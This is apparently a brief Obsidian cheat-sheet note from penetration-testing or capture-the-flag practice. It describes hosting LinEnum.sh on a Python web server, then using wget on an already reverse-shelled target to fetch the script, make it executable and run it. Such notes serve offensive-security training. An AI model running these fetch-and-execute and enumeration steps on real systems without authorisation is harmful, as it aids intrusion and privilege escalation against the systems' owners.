Start a python3 web server

```
sudo python3 -m http.server 8080
```

Back on your reverse shelled target, get the linenum.sh off your desktop

```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `wget http://[yourIP]:8080/LinEnum.sh`;

dv.paragraph("```bash\n" + command + "\n```");
```

Give it exe perms

```
chmod +x LinEnum.sh
```

Run it

```
./LinEnum.sh
```
